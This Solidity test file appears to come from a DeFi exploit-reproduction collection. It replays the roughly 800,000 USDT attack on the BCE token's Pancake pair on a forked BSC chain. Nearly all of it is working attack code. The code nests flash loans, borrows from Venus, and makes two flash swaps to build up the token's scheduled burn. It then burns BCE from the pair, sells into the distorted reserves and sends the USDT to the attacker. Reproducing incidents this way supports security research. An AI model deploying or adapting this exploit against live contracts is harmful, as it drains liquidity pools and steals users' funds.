// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~800,000 USDT
// Attacker : 0x9f7EABD7C3538bA6B9D10Eede63712c0EccE6D69
// Attack Contract : 0xAF7F22831D1eC86D24be51a1760b04aD4b58e9eB
// Vulnerable Contract : 0xcdb189D377AC1cF9D7B1D1a988f2025B99999999
// Attack Tx : https://skylens.certik.com/tx/bsc/0x85ac5d15f16d49ae08f90ab0e554ebfcb145712342c5b7704e305d602146d452

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xcdb189D377AC1cF9D7B1D1a988f2025B99999999#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/2814
//
// BCE records a scheduledDestruction amount during sells into its Pancake pair. A later ordinary transfer burns that
// amount directly from the pair and calls sync(), leaving the pair with almost no BCE reserve. The attacker then sells
// the remaining BCE into the distorted reserves and extracts the USDT side of the LP.

address constant ATTACKER = 0x9f7EABD7C3538bA6B9D10Eede63712c0EccE6D69;
address constant ATTACK_CONTRACT = 0xAF7F22831D1eC86D24be51a1760b04aD4b58e9eB;
address constant BCE = 0xcdb189D377AC1cF9D7B1D1a988f2025B99999999;
address constant BCE_USDT_PAIR = 0xca23E8d408d769661CB480a3fd45d6Be370c45f7;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant VENUS_COMPTROLLER = 0xfD36E2c2a6789Db23113685031d7F16329158384;
address constant vWBNB = 0x6bCa74586218dB34cdB402295796b79663d816e9;
address constant vBTCB = 0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B;
address constant vUSDT = 0xfD5840Cd36d94D7229439859C0112a4185BC0255;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PANCAKE_SMART_ROUTER = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4;
address constant BNB_PAYMENT_RECEIVER = 0x4848489f0b2BEdd788c696e2D79b6b69D7484848;

interface IBCE is IERC20 {
    function scheduledDestruction() external view returns (uint256);
}

interface IPancakeSmartRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

interface IBCEExploit {
    function execute() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 88_215_292;
        vm.createSelectFork("bsc", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(BCE, "BCE");
        vm.label(BCE_USDT_PAIR, "BCE/USDT Pair");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(MOOLAH, "Moolah Flash Lender");
        vm.label(VENUS_COMPTROLLER, "Venus Comptroller");
    }

    function testExploit() public {
        uint256 attackerUsdtBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        uint256 pairUsdtBefore = IERC20(USDT_TOKEN).balanceOf(BCE_USDT_PAIR);

        BCEExploit replacement = new BCEExploit();
        vm.etch(ATTACK_CONTRACT, address(replacement).code);

        vm.prank(ATTACKER);
        IBCEExploit(ATTACK_CONTRACT).execute();

        uint256 attackerUsdtProfit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerUsdtBefore;
        uint256 pairUsdtAfter = IERC20(USDT_TOKEN).balanceOf(BCE_USDT_PAIR);

        assertGt(attackerUsdtProfit, 600_000 ether);
        assertLt(pairUsdtAfter, pairUsdtBefore / 1_000_000);
    }
}

contract BCEExploit {
    receive() external payable {}

    function execute() external {
        // step 1: recursively borrow the Moolah USDT, BTCB, and WBNB balances used to fund the Venus leg.
        IMorphoBuleFlashLoan(MOOLAH).flashLoan(USDT_TOKEN, IERC20(USDT_TOKEN).balanceOf(MOOLAH), abi.encode(USDT_TOKEN));

        // step 5: convert the trace's 15% gross-profit side payment to WBNB, unwrap it, then forward USDT profit.
        uint256 sidePaymentBps = 1500;
        uint256 sidePaymentUsdt = (IERC20(USDT_TOKEN).balanceOf(address(this)) * sidePaymentBps) / 10_000;
        IERC20(USDT_TOKEN).approve(PANCAKE_SMART_ROUTER, sidePaymentUsdt);
        IPancakeSmartRouter(PANCAKE_SMART_ROUTER)
            .exactInputSingle(
                IPancakeSmartRouter.ExactInputSingleParams({
                    tokenIn: USDT_TOKEN,
                    tokenOut: WBNB_TOKEN,
                    fee: 100,
                    recipient: address(this),
                    amountIn: sidePaymentUsdt,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );

        uint256 wbnbOut = IERC20(WBNB_TOKEN).balanceOf(address(this));
        IWBNB(payable(WBNB_TOKEN)).withdraw(wbnbOut);
        (bool paid,) = payable(BNB_PAYMENT_RECEIVER).call{value: wbnbOut}("");
        require(paid, "BNB payment failed");

        IERC20(USDT_TOKEN).transfer(ATTACKER, IERC20(USDT_TOKEN).balanceOf(address(this)));
    }

    fallback() external {
        require(msg.sender == MOOLAH, "only Moolah");
        (uint256 amount, bytes memory data) = abi.decode(msg.data[4:], (uint256, bytes));
        address token = abi.decode(data, (address));
        IERC20(token).approve(MOOLAH, amount);

        if (token == USDT_TOKEN) {
            IMorphoBuleFlashLoan(MOOLAH).flashLoan(BTCB, IERC20(BTCB).balanceOf(MOOLAH), abi.encode(BTCB));
        } else if (token == BTCB) {
            IMorphoBuleFlashLoan(MOOLAH)
                .flashLoan(WBNB_TOKEN, IERC20(WBNB_TOKEN).balanceOf(MOOLAH), abi.encode(WBNB_TOKEN));
        } else if (token == WBNB_TOKEN) {
            runVenusAndBceExploit();
        } else {
            revert("unexpected token");
        }
    }

    function runVenusAndBceExploit() internal {
        // step 2: use flash-loaned BTCB/WBNB as Venus collateral and borrow the available vUSDT cash.
        uint256 btcbCollateral = IERC20(BTCB).balanceOf(address(this));
        uint256 wbnbCollateral = IERC20(WBNB_TOKEN).balanceOf(address(this));
        address[] memory markets = new address[](3);
        markets[0] = vWBNB;
        markets[1] = vBTCB;
        markets[2] = vUSDT;
        IUnitroller(VENUS_COMPTROLLER).enterMarkets(markets);

        IERC20(WBNB_TOKEN).approve(vWBNB, wbnbCollateral);
        IERC20(BTCB).approve(vBTCB, btcbCollateral);
        require(ICErc20Delegate(vWBNB).mint(wbnbCollateral) == 0, "vWBNB mint failed");
        require(ICErc20Delegate(vBTCB).mint(btcbCollateral) == 0, "vBTCB mint failed");
        require(ICErc20Delegate(vUSDT).borrow(ICErc20Delegate(vUSDT).getCash()) == 0, "vUSDT borrow failed");

        runBcePairManipulation();

        // step 4: repay Venus, redeem the flash-loaned collateral, and return to the Moolah callbacks for repayment.
        IERC20(USDT_TOKEN).approve(vUSDT, type(uint256).max);
        require(ICErc20Delegate(vUSDT).repayBorrow(type(uint256).max) == 0, "vUSDT repay failed");
        require(ICErc20Delegate(vWBNB).redeemUnderlying(wbnbCollateral) == 0, "vWBNB redeem failed");
        require(ICErc20Delegate(vBTCB).redeemUnderlying(btcbCollateral) == 0, "vBTCB redeem failed");
    }

    function runBcePairManipulation() internal {
        // step 3: perform two BCE flash swaps, accumulate scheduledDestruction, burn it from the pair, then sell.
        PairFlashHelper helper = new PairFlashHelper(address(this));
        IERC20(USDT_TOKEN).transfer(address(helper), IERC20(USDT_TOKEN).balanceOf(address(this)));
        IERC20(BCE).approve(PANCAKE_ROUTER, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = BCE;
        path[1] = USDT_TOKEN;

        (, uint112 reserveBCE,) = IPancakePair(BCE_USDT_PAIR).getReserves();
        uint256 firstBceOut = uint256(reserveBCE) - 2_100_000 ether; // BCE source line 250 denominator.
        IPancakePair(BCE_USDT_PAIR).swap(0, firstBceOut, address(helper), abi.encode(BCE));
        helper.sweep(BCE);

        uint256 firstSellAmount = (IERC20(BCE).balanceOf(address(this)) * 9) / 10;
        IPancakeRouter(payable(PANCAKE_ROUTER))
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                firstSellAmount, 0, path, address(helper), block.timestamp
            );

        (, reserveBCE,) = IPancakePair(BCE_USDT_PAIR).getReserves();
        uint256 reserveDust = IPancakePair(BCE_USDT_PAIR).MINIMUM_LIQUIDITY() * 10;
        uint256 secondBceOut = uint256(reserveBCE) - IBCE(BCE).scheduledDestruction() - reserveDust;
        IPancakePair(BCE_USDT_PAIR).swap(0, secondBceOut, address(helper), abi.encode(BCE));
        helper.sweep(BCE);
        helper.sweep(USDT_TOKEN);

        IBCE(BCE).transfer(address(1), 0);
        IPancakeRouter(payable(PANCAKE_ROUTER))
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(BCE).balanceOf(address(this)), 0, path, address(this), block.timestamp
            );
    }
}

contract PairFlashHelper is IPancakeCallee {
    address private immutable owner;

    constructor(
        address owner_
    ) {
        owner = owner_;
    }

    function pancakeCall(
        address sender,
        uint256,
        uint256 amount1Out,
        bytes calldata
    ) external override {
        require(msg.sender == BCE_USDT_PAIR, "only pair");
        require(sender == owner, "only owner swap");

        (uint112 reserveUSDT, uint112 reserveBCE,) = IPancakePair(BCE_USDT_PAIR).getReserves();
        uint256 repayUsdt = getAmountIn(amount1Out, reserveUSDT, reserveBCE);
        IERC20(USDT_TOKEN).transfer(BCE_USDT_PAIR, repayUsdt);
    }

    function sweep(
        address token
    ) external {
        require(msg.sender == owner, "only owner");
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) private pure returns (uint256) {
        uint256 numerator = reserveIn * amountOut * 10_000;
        uint256 denominator = (reserveOut - amountOut) * 9975;
        return (numerator / denominator) + 1;
    }
}
